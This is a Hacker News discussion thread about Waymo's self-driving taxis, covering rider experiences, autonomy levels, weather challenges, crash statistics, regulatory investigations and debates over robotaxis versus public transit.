money and space is not spent exclusively in car infrastructure, but cycling and walking and public transport. reply andyjohnson0 10 hours agoparentprev> I live in Phoenix and now take Waymo regularly, and it seems like we're close to a world in which most people take self-driving cars most of the time I live in a big city (larger population than Phoenix) in the Uk and I've never even seen a self-driving car. Anywhere. I don't even think such a thing exists on public roads in my country. That Gibson quote about the future not being evenly distributed, etc. Just a data-point. reply tialaramex 7 hours agorootparentWaymo is basically unique in offering Level 4 Self Driving (hence this article) and they only do this in a small number of locations in the US, such as (parts of) Phoenix - so, yes, you're correct that in the UK, or indeed anywhere outside of those few locations, there aren't real \"Self Driving\" cars. You won't know if people have Level 3 \"Self Driving\" cars because unlike Level 4, the Level 3 cars always have a human sat in the driving seat, it's just that maybe the human isn't paying attention and maybe the car is driving anyway. It may be difficult to gauge (beyond guessing) how many people you see are bad drivers and how many aren't actually driving at all under L3... L1 (the machine does some of the work but a human driver is always doing much of the driving) is certainly something you see and don't even think about. Intelligent Cruise control (ie it won't smack into the car ahead but instead slow down) on a motorway, maybe automatic lane keeping on somebody's fancier or newer car, it's not \"Self driving\" as you'd understand it, but it's something. The way these \"Levels\" work is L3 to L4 is the point where we transition from \"The human is legally driving but the machine is offering more and more assistance\" to \"The machine is legally driving and the human is asked less and less often to do anything at all\". As a result a person who is literally blind and thus couldn't possible drive the car or obtain a license to do so - can (and they do) use a Waymo, just like they'd use an Uber, but they cannot do the same with Tesla \"Full Self Driving\". reply nradov 4 hours agorootparentThere are only a handful of Level 3 autonomous driving systems in existence. The Mercedes-Benz Drive Pilot system illuminates exterior turquoise lights to indicate when it's active so you don't have to guess who is driving. I'm not sure whether Drive Pilot is available in the UK yet. https://www.autocar.co.uk/car-news/technology/mercedes-use-t... reply returningfory2 5 hours agorootparentprev> I live in a big city (larger population than Phoenix) in the Uk Thatâ€™s an interesting way of saying you live in London ;) (Phoenix urban area is more populous than every urban area in the UK except for London) reply andyjohnson0 3 hours agorootparentManchester not London. According to Kagi the population of Greater Manchester is 2.8 million vs 1.61 for Phoenix. reply iamdelirium 3 hours agorootparentYou're comparing a county area (Greater Manchester) with the direct city population. Phoenix's metro population alone is 4.8m. reply andyjohnson0 2 hours agorootparentYou're right. Thanks for pointing that out. I think my point stands, that even large urban areas in the UK have no SDVs. reply grecy 4 hours agorootparentprevSure, it's also worth pointing out nobody in Pheonix has ever seen a person with universal healthcare or free university education. Countries develop at different rates on different things. reply harmmonica 20 hours agoparentprevI've said this on HN before as well, but I've turned into a full-on Waymo evangelist (Los Angeles user here). Couple of things to add to Jake's comment... The driving experience itself is on par with the \"best\" drivers I've ever ridden with (things like stopping at actual stop signs, for instance, and not racing from one traffic light to the next, and being courteous to bikes and pedestrians), not to mention just the peace and tranquility of being in a car solo when you're not having to drive (I know, I know, mass transit is better for countless reasons and this is actually doubling down on human isolation which is probably not great long term). Anyway, I have zero interest in getting into an Uber at this point. I'd wait longer and pay more for a Waymo if given the choice. And I'm fully aware people will, if this works more broadly, lose jobs bc of it. I'm not insensitive to that, but I don't think the genie is going back in the bottle barring catastrophic incidents by Waymo et al that cause regulators to kill self-driving cars altogether. Note that I did witness an incident where on a road with no lane markings the Waymo straddled a left turn \"lane\" and a straight-travel lane. It's an intersection I transit often and normal drivers have great trouble with and frankly makes me uneasy every time I turn left there as well. The Waymo was definitely perplexed by it. For those who talk about how Phoenix's roads are straight and wide... This is not true in Los Angeles (nor in SF though SF is more of a compact grid than LA). For those of you unfamiliar, a lot of the streets in LA where Waymo operates today are very narrow, with cars parked on both sides and so there's inadequate room for two cars to go down them without waiting for another car to pass. These same streets have zero lane markings on them. I've experienced this several times in Waymo to date where the car just \"gets it,\" though it's almost too cautious when it needs to get over to let another car pass when there's not enough space for both. And if you read all of that and say \"what about the weather?\" It's obviously an issue and I fully agree it will delay the rollout \"everywhere.\" All that said, I cannot wait until I can jump in one of these things, from Waymo or any other company, and safely go up to the mountains or some other road-trip destination. The economics of longer trips, particularly to rural areas, are likely tricky bc of the inability to count on a return fare, but, man, I do think self-driving cars are a radically important technology that will vastly change how we transit and, really, how we live. That is, if they don't fuck up too much en route to getting there. reply ianstormtaylor 14 hours agorootparentHonest question out of curiosity, since you seem genuine and open to discussionâ€¦ I agree with all of your points about Waymo vs. Uber-like ridesharingâ€”the average Uber ride is so much less safe that itâ€™s hard to argue for. But I also agree with your aside about the growing isolation of societyâ€”the longer term implications of every event, meal, and errand being separated by autonomous journeys are staggering. So the question is, how do the societal isolation factors play into your decision making? (Honest question, not a gotcha, Iâ€™m curious how others think about these tradeoffs.) reply standardUser 10 hours agorootparentIf you're already inclined towards isolation, like I am sometimes, driverless taxies will help with that. But if you're inclined towards going out and doing things, which I also am sometimes, there are few incentives more alluring than a fast and cheap way to get from point A to point B. If labor and gasoline are removed from the equation there's no reason rides can't be ridiculously cheap, and spending $20 on a round trip instead of $80 lowers one of the biggest barriers for going out (at least in urban areas and/or when drinking/drugs are involved). reply nl 8 hours agorootparentCheaper, safer and more effective transportation seems likely to increase mobility and decrease isolation. reply BillyTheKing 10 hours agorootparentprevI can spend more times at my friend's place, maybe have a beer or two without having to worry about driving back - so I think it encourages socialisation reply harmmonica 12 hours agorootparentprevI'm not sure if you mean about Waymo/self-driving cars or more broadly, but I'll assume you mean cars. Let me first say I'd love to create a list of all of the long-term pros and cons of self-driving cars because I'd be far better-equipped to answer, but my off-the-cuff thought: this technology, if it survives, will make it easier, safer, less stressful and less costly for people to transit, and will also make almost every place more livable (the impacts will be more profound in urban areas than rural, but both will benefit). That sounds like a great way to increase interactivity, not lessen it. reply 0xDEAFBEAD 14 hours agorootparentprevUber sometimes offers a service called UberPool where you share the car with another passenger in order to save money right? Couldn't Waymo do the same? reply _carbyau_ 13 hours agorootparentDidn't Uber start branded as a \"ride sharing\" app where the app helped you find someone to car pool into work with? I suspect an underlying issue with socialising is faith in humanity. It's hard to have faith in humanity in the modern world when every front appears to be telling you otherwise. If you don't have faith in humanity, then you're limited to only interacting with those: \"you have to\" and \"are vetted\". reply sgerenser 7 hours agorootparentThat was Lyft. Uber started as an easier/cheaper way to call for a ride in a â€œblack carâ€. reply ianstormtaylor 14 hours agorootparentprevThey could in theory yeah. Iâ€™m not sure if Uber still offers it, but I think its uptake is so low (anecdotally from people I know) that itâ€™s effectively not a solution to societal isolation, because it doesnâ€™t end up being used. reply upbeat_general 13 hours agorootparentI thought it was pretty well used pre-covid, especially when the rides were sometimes 50% of a regular ride. At least I personally used it a lot, and knew several people that did. reply echoangle 14 hours agorootparentprevHow is that different than if you were driving yourself? reply ianstormtaylor 14 hours agorootparentWell, Iâ€™d say itâ€™s different in a similar way that Uberâ€™s are different from driving yourself. For physical trips itâ€™s similar, but lower barrier to entry, so you do it more. And for deliveries itâ€™s a much lower barrier because you donâ€™t drive at all. reply badcppdev 7 hours agorootparentprevCan you just clarify in the situation where, 'the Waymo straddled a left turn \"lane\" and a straight-travel lane', whether the behaviour of the Waymo was 'safe' although obviously incorrect for multiple reasons? reply harmmonica 2 hours agorootparentIt was absolutely incorrect on the Waymo's part. I was trying to counterbalance my positivity with a mistake I've seen a Waymo make. That said, I would not call it unsafe because where it was located it was not going to lead to an accident. It was confused by the intersection, which also happens to human drivers at that intersection. That is not to excuse the Waymo (\"oh, it's just like a person so that's ok!\"), just trying to point out that it may be a great driver (again, my opinion), but doesn't mean it's infallible. Of course others on this thread have pointed out statistics about how Waymos are faring, but I was just trying to share my experience riding in one. reply HeyTomesei 10 hours agoparentprevI disagree. Phoenix has the perfect climate for self-driving cars. It will require a major technological leap in order for them to succeed in the \"real world\" (fog, rain, snow, etc). reply boulos 10 hours agorootparentDisclosure: I work for Waymo. We handle both dense fog and heavy rain on the latest vehicles. The best blog post is probably https://waymo.com/blog/2021/11/a-fog-blog/ but you can find a lot of videos in the rain. Snow and very cold weather is a challenge for sensor cleaning. We've done some testing in both NYC and Buffalo (https://waymo.com/blog/2023/11/road-trip-how-our-cross-count...) to collect data. reply 83 3 hours agorootparentI'm rooting for you, but I live in snow country and always have a chuckle any time someone says self driving will be ready soon. There's so many situations that need to be handled when driving in winter and some of them I can't even imagine how you'd address in software. Winter here changes daily between - no road lines visible - snow packed into ice randomly making the road a a camouflage pattern - snow is fresh/deep so no road is visible and you navigate based on the slight hump in the snow where you know there's a curb - same as above, but instead of a curb a slight indent where there's a ditch - slush piles outside the tire lanes, which if hit will suck you in or cause you to spin out - ice/snow on hills, so time your arrival for rolling stops at intersections because stopping is not an option - active snowfall (limited camera vision, and I'm guessing reduced/useless signal from lidar) - hail - sporadic black ice (its easy to slow down when its icy everywhere, but knowing when and where black ice is likely when it's sporadic is a skill) - the \"lanes\" formed by peoples tires in the snow often don't align with the official road, and sometimes a lane goes missing in this situation And all that's after you deal with sensor cleaning. reply SoftTalker 2 hours agorootparentWhat will happen is that you just won't be able to go anywhere until the roads are cleared. That is probably not a bad thing, it will allow plow trucks to clear the roads more quickly without having to navigate around people driving (or trying to drive) on the uncleared roads, spun out/stuck vehicles, crashes, etc. reply 83 2 hours agorootparentWe're not really at self driving if the solution for poor conditions is \"don't drive\". Snow drifts in the wind, side roads don't get regularly plowed, and conditions change rapidly so unless they can handle the majority of the list above then they won't be able to handle winter period. reply danielrhodes 2 hours agorootparentprevIâ€™m not saying I would trust getting into a Waymo now in those conditions, but I also wouldnâ€™t assume the same things that are difficult for humans will be difficult for self driving. Iâ€™m optimistic these hurdles can be overcome. reply 83 2 hours agorootparentOh I'm also optimistic they can be overcome, I'm just less optimistic on the timeline. I'll be pleasantly surprised if self driving can handle winter a few decades from now. reply titanomachy 21 hours agoparentprevIn the same vein, I don't ride uber often but when I do I often find that drivers leave their windows closed and car's air circulation turned off completely. When I ask for \"a bit of airflow\" they apparently hear it as \"I'm too hot\", so they turn AC to maximum power. I'm not sure whether this reflects their own preferences, what they think customers want, or if they are just completely oblivious. reply okdood64 21 hours agorootparentI have never had trouble cracking open the window on my own. Do you not try? reply seanmcdirmid 12 hours agorootparentThe child safety disable is often turned on for backseat windows. reply nullc 12 hours agorootparentprevDon't be too timid to tell them what you want. If they turn out the AC to max instead, just say \"Sorry, I'm not hot I just want some fresh air.\" reply hnav 19 hours agoparentprevThe olfactory problem with waymos is that if someone gets in one dirty or foul smelling there isn't a driver to kick them out. Waymos are starting to get more ridership and some of those people are going to be absolute pigs. I gave feedback to Waymo about a recent ride where the entire car smelled like a fat, unwashed ass and the best case scenario there is that they took the car out of rotation immediately, the rider right before me left it that way and that the rider will be identified after several instances of those reports. The reality is probably that the car picked up several riders after me until one reported a problem mid-ride. reply hypothesis 11 hours agorootparent> I gave feedback to Waymo about a recent ride where the entire car smelled like a fat, unwashed ass Knowing BigCo reputation, I think itâ€™s equally possible that Waymo and/or BigCo accounts will be banned for actual perp, complainant or random rider in-betweenâ€¦ what a worldâ€¦ reply 83 3 hours agorootparentWouldn't take long before that gets abused I bet. I'm picturing a world where someone knows their ex uses Waymo to get home every day so requests rides around that time/place so they can report them as odorous/damaged/vomit/etc and get the prior rider banned. reply mavhc 10 hours agorootparentprevNeed to add some smell sensors to the inside of the car, as well as the cameras reply nullc 12 hours agoparentprevHumans are astonishingly and unreasonably good at driving. There are, indeed, a lot of traffic deaths but this is because we drive a mind-boggling amount so even a very low rate of fatalities adds up to a substantial number. A significant portion of traffic deaths also occur in special conditions-- at night, with intoxicated persons, in bad weather. Existing self driving cars won't even drive in those more difficult conditions. In terms of the passenger miles driven if you compare to non-intoxicate humans the expected number of deaths for self driving cars is still below 1 if they were as safe as non-intoxicated human drivers. Safer cars are an excellent goal but they're not automatically a given result for self driving. > Waymos avoid many of the Uber challenges: foul-smelling \"air fresheners,\" dubious music / talk radio choices, etc. And introduces new ones like being dropped off blocks from your destination because the car refuses to drive on perfectly fine roads, service being unavailable in poor weather, and extending Google's tracking of everything you do online to offline. :D Aside, you can just ask uber drivers to turn off the radio. reply tzs 3 hours agorootparent> Humans are astonishingly and unreasonably good at driving. There are, indeed, a lot of traffic deaths but this is because we drive a mind-boggling amount so even a very low rate of fatalities adds up to a substantial number To put some numbers on it in the US cars are driven about 3.2 x 10^12 miles per year, and around 4 x 10^4 people are killed in car accidents (drivers, passengers, pedestrians, and cyclists). That's one death per 8 x 10^7 miles. There are around 2 x 10^6 people non-fatally injured in car accidents per year in the US. That's an injury every 1.6 x 10^6 miles. There are around 4 x 10^6 non-injury car accidents per year in the US, which is one every 8 x 10^5 miles. If we assume all miles driving are equally risky and that we drive 40 miles per day 365 days a year, then we would expect to be in a non-injury car accident around once every 55 years, be injured in a car accident around once every 110 years, and be killed in a car accident around once every 5500 years. Of course almost no one drives all their miles at times and in conditions when the risk per mile is average so when estimating your personal risk you need to take that into account. reply jogjayr 2 hours agorootparentAn injury every 1.6m miles isn't amazing. That is almost a 1/3 lifetime chance of injury if you drive an average of 12k miles annually for 50 years. (Sidenote: human units are easier to read). A comment I wrote 3 years ago has more: https://news.ycombinator.com/item?id=26950254 The old \"look at the person to your left, now look to the person on your right\" meme comes to mind. One of you will probably have an accident with an injury in your lifetime. I ran the same calculation for dying in a car accident and got a lifetime probability of 0.7%, but I'm not sure I did it right. reply webel0 22 hours agoprevWaymo is currently under investigation for multiple incidents, not all of which it had previously disclosed to the NHTSA [0]. The recent light pole incident also doesn't help [1]. If they are doing 50k rides a day, then they would appear to have a remarkable safety record. It will be interesting to see if these investigations lead to a repeat of the Cruise debacle or if this will become the price of doing business. [0] https://www.reuters.com/business/autos-transportation/us-saf... [1] https://www.youtube.com/watch?v=HAZP-RNSr0s reply dexwiz 21 hours agoparentAnecdata, but watching the Waymo cars compared to Cruise (preban) was night and day. Before Cruise was banned in SF, I would often see them violate traffic laws and fail to navigate basic intersections. Waymo isn't perfect, but its better than Cruise and the average SF driver, which is good enough for me. reply not-my-account 21 hours agorootparentAnecdata 2, I bike through SF almost daily, and much prefer a Waymo driving near me as opposed to your average SF driver. reply 1oooqooq 14 hours agorootparentthat's cool. until it's not. it's very easy to release an upgrade of stopping less on stop signs and see data increasing profit and not increasing accidents. same with code updates that will make cyclist life worse, unless there's actual change in a kpi they track. you're not really their main concern, specially after they ipo and get acquired by Apollo or billionaire du jour reply asoneth 5 hours agorootparentIn the United States there are few legal repercussions when a human driver kills someone as long as they are sober and utter the phrase \"I didn't see them\". Therefore, biking on US roads means trusting in the inherent goodness (and attentiveness) of the drivers around you. Driverless cars run by a company protecting itself from reputational and legal risk seems less dystopian than the status quo. reply twoWhlsGud 2 hours agorootparentYes, I don't understand how anybody who's ever ridden a bike in a major American city isn't super excited about high-quality self driving vehicles. The crazy stuff I see on a daily basis while out biking in Seattle (and statistically we are one of the best places to bike in the US) means I can't wait until these things take over :-) reply pquki4 8 hours agorootparentprevWhat does that even mean? If Waymo hits a cyclist which leads to death, and Waymo is found to be at fault, that's definitely going to make headlines and potentially lead to a pause of the entire operation. reply nl 8 hours agorootparentprevWeâ€™ve already seen regulators are willing to take strong actions against dangerous operators. These regulators should be supported and kept clear of regulatory capture. Other countries can do this, so should the US. reply greiskul 12 hours agorootparentprevThat's just being a cynic for cynicism sake. They are already owned by a billionaire company, so there is no ipo. And they still have at least a couple of decades where the game they need to play is get riders and legislators to trust them, so they are incentived to make their car very safeful so they can roll out to more cities and countries. It takes one bad accident to get the public to turn against them, and there is no technological edge that can save you if the government decides to make your entire business illegal. reply threeseed 13 hours agorootparentprevWaymo is a subsidiary of Alphabet. And not sure why you think running stop signs or any anti safety measures would increase profits. reply bigfudge 12 hours agorootparentBecause once the current safety scrutiny has passed you might get more trips done by setting the ai to be more aggressive in traffic. Then you are into VW style software updates with a profit motive and no mechanism to hold them accountable? reply krisoft 11 hours agorootparent> no mechanism to hold them accountable Like banning them altogether following a public outcry? That is the mechanism to hold them accountable. Also in individual cases it will be very easy to sue them for accidents they caused or contributed to. Already is. Where does this â€œno mechanism to hold them accountableâ€ comes from? reply simion314 10 hours agorootparentprev>And not sure why you think running stop signs or any anti safety measures would increase profits. Because this big companies like Google are actually evil. As an example the mobile YouTube app does not let you use it if you turn off the screen. So Google decided that wasting energy and killing batteries is an acceptable thing to do, this is pure evil - I would accept they adding more advertising or whatever but killing the life span of a device and wasting energy is truly evil shit. reply jseliger 22 hours agoparentprevThe overall safety record is amazingly good: https://arstechnica.com/cars/2023/12/human-drivers-crash-a-l... reply choppaface 21 hours agoparentprevWaymo has notably escaped any investigation of the \"Prius vs Camry\" crash induced during unsafe testing done in pursuit of a demo https://www.newyorker.com/magazine/2018/10/22/did-uber-steal... > The car went onto a freeway, where it travelled past an on-ramp. According to people with knowledge of events that day, the Prius accidentally boxed in another vehicle, a Camry. A human driver could easily have handled the situation by slowing down and letting the Camry merge into traffic, but Googleâ€™s software wasnâ€™t prepared for this scenario. The cars continued speeding down the freeway side by side. The Camryâ€™s driver jerked his car onto the right shoulder. Then, apparently trying to avoid a guardrail, he veered to the left; the Camry pinwheeled across the freeway and into the median. Levandowski, who was acting as the safety driver, swerved hard to avoid colliding with the Camry, causing Taylor to injure his spine so severely that he eventually required multiple surgeries. > Levandowski and Taylor didnâ€™t know how badly damaged the Camry was. They didnâ€™t go back to check on the other driver or to see if anyone else had been hurt. Neither they nor other Google executives made inquiries with the authorities. The police were not informed that a self-driving algorithm had contributed to the accident. > According to former Google executives, in Project Chauffeurâ€™s early years there were more than a dozen accidents, at least three of which were serious. One of Googleâ€™s first test cars, nicknamed kitt, was rear-ended by a pickup truck after it braked suddenly, because it couldnâ€™t distinguish between a yellow and a red traffic light. Two of the Google employees who were in the car later sought medical treatment. It was a long time ago, but Larry Page was well aware of it, and imagine if that incident received fair coverage and investigation. reply jeffbee 21 hours agorootparentI am having trouble imagining this scenario in a way that makes Waymo look as bad as you imply. It sounds like the human-driven vehicle if it was \"boxed in\" on an on-ramp needed to slow and merge, rather than racing to pass on the right, running off the road, and causing a spectacular single-vehicle wreck. The way it's described in that paragraph seems to be ironclad proof of the need to promptly relieve humans of driving tasks. reply upwardbound 20 hours agorootparentIt doesn't make the tech look bad, but to me it makes the safety driver & the other executive look callous and uncaring. > They didnâ€™t go back to check on the other driver or to see if anyone else had been hurt They should have made sure the driver was okay. reply michaelt 6 hours agorootparent> It doesn't make the tech look bad, but to me it makes the safety driver & the other executive look callous and uncaring. The safety driver was Anthony Levandowski, who left Google for Uber, taking with him a bunch of stolen IP, at Uber ran a cowboy self-driving car division that got pedestrians killed, Levandowski got sued by Google, ended up in prison and Uber laid off the entire division. Later he was pardoned by Trump. So good news - the callous and uncaring safety driver has been fired, sued, and imprisoned. reply choppaface 55 minutes agorootparentLarry Page knew about the crash and tried to retain him reply drdec 20 hours agorootparentprevI don't understand the downvotes of the parent post. I am unfamiliar with the details of this incident and my reading based on the facts presented is similar. Could someone provide more information? reply 1oooqooq 14 hours agorootparentthreads on hn brings people from the mentioned company. all root comments saying bad things will always get downvotes. reply xnx 7 hours agorootparentprevLevandowski stole Waymo trade secrets, and only escaped the full consequences of his actions because of a Trump pardon. He is not representative of anything about Waymo in 2024. reply choppaface 47 minutes agorootparentLarry Page was an ardent supporter of Levandowski and this evidence illustrates Waymoâ€™s core safety culture: that theyâ€™re above regulation and above the law. Same mindset illustrated in Googleâ€™s anti-trust trials. reply vincnetas 13 hours agoprevAs a proponent of good public transportation I'm a bit afraid that automated taxis will get big enough in USA that they will start influence city wide decisions on how to develop city transport network even in Europe when time comes for them to expand their business. reply tsycho 3 hours agoparentI have the opposite take/hope. Self driving buses will be such a boon for public transportation. Now you can have 24 hour buses, that operate on holidays as well, or even dynamic, short term routes based on demand (eg: after a concert or sports event), without being dependent on the availability of pre-allocated human drivers. reply jillesvangurp 12 hours agoparentprevNo need to be afraid. Public transport will evolve to include small autonomous vehicles. The economies of scale you get by packing people in larger vehicles mostly have to do with the cost of fuel and staffing. Electrical autonomous vehicles don't have a need for a driver and electricity is relatively cheap. So you don't get much economies of scale by making them bigger. Most city journeys would be under a kwh. Even at current grid pricing that's cheap. Eventually, cheap autonomous vehicles could be mass produced at low cost and would have very low operational cost. So the ride cost would be comparable to, or lower than, current public transport options. reply Denvercoder9 12 hours agorootparent> The economies of scale you get by packing people in larger vehicles mostly have to do with the cost of fuel and staffing. Trains (and train-like options such as metros) are vastly more efficient than cars in number of people moved per unit of time per area used. That might not be a big deal in suburbia, but in dense inner cities it's one of the most important drivers of public transport. reply jillesvangurp 11 hours agorootparentAutonomous vehicles could chain up or drive really close together and achieve similar space efficiency. Also, if you look at a train track. It's mostly empty space with a train passing occasionally. Very different than a well used road. And autonomous vehicles could collaborate to counter any congestion. What makes trains efficient has more to do with the cost of energy and drivers than anything else. Both of those go away if you have autonomous electrical vehicles. reply slyall 10 hours agorootparentThat \"train passing occasionally\" holds the equivalent of hundreds of cars. A random crappy light rail line will do the equivalent of 5 lanes of traffic (each direction). A serious subway more like 20. https://visual.ly/community/Infographics/transportation/solu... Even if you run cars with no distance between the bumpers you'll still need room for changing lanes, crossing and the line. reply jillesvangurp 5 hours agorootparentThe New York subway moves 3.2 million people per day. Taxis and ride share options are together good for about 1 million. Mostly non autonomous and polluting of course. If you triple that with autonomous vehicles that use the road smarter, it sounds doable to match what the subway is moving around. And of course people would be using these for point to point traffic and cars would be able to re-route based on traffic as well. We'll see how this plays out. reply mike_hearn 9 hours agorootparentprevThese comparisons are never quite apples-to-apples because the heavy rail line assumes only a few passengers have any luggage and that the entire line is used only for passengers, whereas the capacity rating for a road allows everyone to take large amounts of luggage and freight is always mixed in as well. You also have to take into account all the other factors that make roads preferable, for example, that rail capacity number assumes perfect utilization. In practice railways often have lots of downtime due to overnight shutdowns, broken signals/trains and labor strikes. None of these affect the roads. reply tialaramex 6 hours agorootparentWhere can I buy these roads that don't require maintenance ? Cars that never break down ? Road traffic signals that never fail ? For the first I'm asking for a friend as the road outside her front door is currently torn open for a whole month and it sure seems like \"Just magically never do that\" would have been a better option if you insist it's so easy. The lines near me have freight on them (I live in a port city, a noticeable fraction of the country's imports and exports go via intermodal containers on trains) and still run like two services to London and two to other big cities per hour. The freight has to fit in between passenger services, that's a policy decision and the US just picked wrong. reply slyall 6 hours agorootparentprevYou are moving the goalposts here. However if you want to compare mixed freight and passenger lines then rail equals many, many lanes. Plenty of rail cars have room for luggage too or even baggage cars. Usually we are talking about people going to/from work however hence most people are not carrying lots. Are you really saying your roads don't have shutdowns for maintenance? Or other problems? Also it is pretty rare for either roads nor railways to be fully utilised overnight. Also note that plenty of rail systems do run overnight. reply drozycki 11 hours agorootparentprevNot according to civil engineers (it's not even close) Private motor vehicles: 600 - 1600 per hour Mixed traffic with frequent buses: 1000 - 2800 per hour Two-way protected bikeway: 7500 per hour Dedicated transit lane: 4000 - 8000 per hour Sidewalk: 9000 per hour On-street transitway, bus or rail: 10000 - 25000 per hour https://nacto.org/publication/transit-street-design-guide/in... reply morsch 11 hours agorootparentprevUrban train tracks see more than occasional traffic, whatever that means. And those trains often carry hundreds of people. Meanwhile, a well used road is well used by huge vehicles carrying 1.2 pax on average. And energy isn't free. If we had any intention of becoming net zero, electricity prices had better increase. And driving around 2t empty weight isn't the way to get there. Incidentally, a trip that's less than 1 kWh (so, less than 6 km) is a trip that could easily be made on foot or by bike. reply fire_lake 7 hours agorootparentprev1. Still not as passenger dense as a train or a bus 2. They will need stop some time. Where? Will this block the street? 3. They wonâ€™t all go to the same place so there will be delays at junction and side streets 4. No margin for error wouldnâ€™t fly in practice, so the cars cannot be that close together 5. How will pedestrians cross a train of cars? I just donâ€™t see how this all adds up. Automation doesnâ€™t remove the space constraints of cars in cities. reply fire_lake 7 hours agoparentprevPeople are already arguing against trains and bus lanes since â€œone day there will be self driving carsâ€. reply baron816 12 hours agoparentprevI'm sorry but good public transit in the US isn't going to happen. Passenger rail has never been profitable anywhere since its very inception. With the rise of remote work, and declining ratios of working-age populations putting increasing pressure on public finances, we're just never going to see a widespread expansion of public transit. AVs give us a path toward a world where very few people need to own their own car. We can put all those parking spaces to better use. We can improve equity by giving more people access to safe, reliable, affordable, and convenient point-to-point transportation. Being able to consistently get a ride to where you need to go is something we consistently under-appreciate. It means being able to get a better paying job on the other side of town. Or not having to worry about missing a dialysis appointment, or a meeting with your parole officer or therapist. When the marginal cost of a robotaxi/robobus ride is close to zero is when the AI economic boom will really begin. reply eliaspro 6 hours agorootparent> Passenger rail has never been profitable anywhere since its very inception. Interestingly, no one ever argued for the profitability of cars, so all we can do now is to calculate the overall economic costs and societal benefits and that's where public transport clearly and easily wins. reply c-cube 7 hours agorootparentprevAnd the day the Google bot decides to close your account for obscure reasons, with no recourse, all you can do is stay in bed and starve cause all these things are now inaccessible to you ? Even if self driving actually happens, it'll be the ultimate surveillance-ridden, enshitiffied service that will ruin not just the internet but our whole lives and cities. reply skywhopper 9 hours agorootparentprevHow exactly will a robotaxi ride ever reach zero marginal cost? reply baron816 4 hours agorootparentWith competition. The marginal cost for each ride is just cheap, abundant energy from renewables, and maintenance. reply krisoft 11 hours agoparentprevDonâ€™t be. Autonomous vehicles can be busses too. reply mike_hearn 9 hours agoparentprevTaxis are a form of public transportation. After all, what's the major difference between a taxi and a bus other than capacity/driver attention? reply leoedin 9 hours agorootparentTechnically they are, yes, because they're open to the public. But the impact of taxis on road traffic in a dense city is comparable to the impact of private cars - perhaps even more so as they're often travelling empty between rides. If every journey which was previously done with a car is done with a taxi, there's no reduction in vehicle traffic - meaning the same problems of congestion and pedestrian safety. Driverless cars can probably drive closer on highways to increase throughput, but that doesn't really help in cities or residential areas. Ultimately if lots of people shift to driverless taxis to get around, there will be far more vehicles on our streets. reply fire_lake 7 hours agorootparentTaxis are often worse since they drive around looking for fares. reply vincnetas 9 hours agorootparentprevMajor differences of Bus/Tram/Metro vs Car (robo or not) is number of passengers that can be transported per \"time\"/\"dolar/\"citi space used\". And my feeling is that cars are not on the wining side here. And remember Bus/Tram/Metro can also be driverless. reply sowbug 4 hours agoprevWaymo was smart to start with taxis. A self-driving car's competition is you, and of course you're an above-average driver. But a taxi's competition is the average Uber driver. People can be more objective about that low bar. reply helsinkiandrew 6 hours agoprev> ... and made robo-taxis a real business Has it though? They've come an impressively long way to have 50,000 rides a week, but that needs to increase a thousand fold to justify the $6B of venture capital and $30B valuation. That's a lot of cars and a lot more work than it takes Uber to bring on another underpaid owner driver (Uber has 23 million rides per day) reply 1024core 1 hour agoprevI wouldn't call it a \"real business\" just yet. I've heard they do 50,000 rides per week in SF, LA, Phoenix combined. Assuming they make $20/ride, that's still $1M/week, or $52M/year. I'm sure they spend in Billions/year. They would have to scale out to every major city in America and add another 10000 cars before they can turn a profit. reply ripe 21 hours agoprevRobotaxis are \"a real business\"? Maybe in the future, but not yet. From the article: > But even the most bullish believers in autonomous transportation acknowledge the tech still has a ways to go before itâ€™s reliable enough for widespread deployment on U.S. roads. reply lvspiff 21 hours agoparentI was blown away going around Tempe/Scottsdale - Waymos everywhere with people walking around, crossing streets randomly to get to a spring training game, doing bar crawls (it was st patricks day) and what blew me away was they pulled up in front of hotel and even made a quick u-turn to get out of the parking lot. I mean this is really impressive stuff. The future is now imho. I will give tempe/scottsdale credit though - they have their roads around the major tourist hubs in GREAT shape - the lines crisp and the lights bright and new - I think it makes it much easier for a waymo to get around. reply boc 20 hours agorootparentWaymos do the same thing in SF where the streets are much denser, traffic is weirder, hills are way steeper, and the roads aren't in perfect shape by any means. The amount of impressive navigation I've seen around delivery trucks, weird construction patterns, etc has been pretty wild. They seem way ahead of the other options on the road. reply dboreham 4 hours agorootparentCould some of that impressive driving have been done by remote human operators? reply boc 4 hours agorootparentNot from what I've seen - it happens in real-time just like most human drivers. I don't believe that a remote controlled operator is even permitted, but I could be wrong. Waymos drive fairly fast and aggressively in rush hour traffic too, which is why I enjoy sharing the road with them. I was initially worried they'd drive like a grandma but that hasn't been the case. Also as a cyclist I enjoy riding near them because they know I'm there and they give you enough space in the bike lane. reply xvedejas 21 hours agoparentprevThey're the present here in SF, driving every day and more safely than the humans do. And as a human driver, I can testify that these streets are not particularly easy to drive on. reply robotnikman 21 hours agorootparentThey are here in the Phoenix area too and I have not seen and issues with them. However, we are blessed by sunny weather 99% of the time. I think the biggest challenges will be having them drive in adverse weather conditions present throughout the rest of the country, such as blizzards, hail, torrential rain, dense fog. reply 8note 18 hours agorootparentI don't think blizzards, hail, torrential rain, and dense fog will be particularly challenging for waymos, at least not keeping the card driving in a controlled a predictable state. The hard thing is that every other human car acts randomly because they don't say, have winter tires, and unlike waymo, don't have the very quick control loop. reply cut3 21 hours agorootparentprevOh they have issues. Waymos are super janky when they are in parking lots, often just sitting in the middle of the driving lane waiting for their fare. I dont think they know how to park in a lot correctly. It is also funny to watch them get stuck behind busses, having followed too close to safely go around them when the bus stops to pickup/dropoff. Also Ive seen multiple instances of them trying to turn left on red and pull far enough into an intersection to cause issues. Finally when I am on my skateboard they dont seem to recognize me as they drive very very close and fast, though I havent felt risky enough to really test this. reply Karrot_Kream 14 hours agorootparentInteresting, as a cyclist Waymos have always been very aware of me and usually slow down for me if I've taken the lane, and stop for me if it's starting to move after picking up someone but sees me pass. I wonder if their training set doesn't have enough skateboarders. reply arebop 21 hours agorootparentprevWe have abundant fog and seasonal rain in SF, but not much hail or snow. That's why they've done winter testing in Tahoe (since 2017) and Buffalo NY (last winter). reply seanmcdirmid 12 hours agorootparentprevYou know, thatâ€™s a challenge for human drivers as well. Try getting an Uber during those weather events, their might be one or two running crazily to get super surge pricing when there are usually a few hundred. reply hnburnsy 21 hours agorootparentprevNot just sunny weather, but straight streets laid out in a N/S and E/W pattern, very little grade, and consistent numberingaming across cities. reply chpatrick 21 hours agorootparentprevI used one when it was somehow raining in Phoenix and it worked fine apart from being a bit confused by a puddle when stopping. reply jeffbee 21 hours agorootparentprevWaymo is likely already better than a upper-quartile meat module under those conditions. 